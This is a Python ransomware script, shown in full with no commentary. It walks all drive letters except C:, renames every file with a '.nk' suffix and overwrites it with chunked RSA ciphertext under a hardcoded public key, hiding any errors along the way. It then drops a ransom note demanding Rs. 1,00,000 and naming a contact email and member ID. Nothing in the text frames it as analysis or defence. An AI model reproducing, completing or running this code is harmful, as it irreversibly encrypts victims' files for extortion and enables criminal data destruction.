global publicKey
m_id = '1234567891'
publicKey = 'PublicKey(100344468852563328383277568788371688977622772348774272957983298772109455949487464810329714452500361621275334550154550849646963775008534841807540871209536821206194226600042096399948428324203734948792080218704997693923161084983485822904338802385816489505033045901349274554160760617085801262443018996780487397363, 65537)'

import os
import rsa
import pickle

t = publicKey.split(', ')
n = int((t[0])[10:])
e = int((t[1])[:-1])

def encrypt():
    global publicKey

    for part in range(65, 91):
        if part != 67:
            partpath = chr(part) + ":\\"
            try:
                for dirpath, dirs, files in os.walk(partpath, topdown = True):
                    dirpath = dirpath + "\\"
                    for filename in files:
                        i = 0
                        x = {}
                        fname = dirpath + filename
                        if filename != "e" + m_id + ".exe":
                            nfname = fname + ".nk"
                            os.rename(fname, nfname)
                            with open(nfname, 'rb') as f:
                                while True:
                                    data = f.read(117)
                                    if data:
                                        ct = rsa.encrypt(data, rsa.key.PublicKey(n, e))
                                        x[i] = ct
                                        i += 1
                                    else:
                                        break
                            with open(nfname, 'wb') as f:
                                pickle.dump(x, f)
            except:
                pass

encrypt()
with open("nk_readme.txt", 'w') as f:
    f.write("YOUR FILES ARE ENCRYPTED !!!\n")
    f.write("WANT TO GAIN ASSCESS AGAIN ?\n")
    f.write("CONTACT US AT tnkrish02@gmail.com WITH YOUR MEMBER ID\n")
    f.write("YOU WILL NEED TO PAY RS. 1,00,000 ONLY\n")
    f.write("MEMEBER ID : ")
    f.write(m_id)
    f.write("\n")
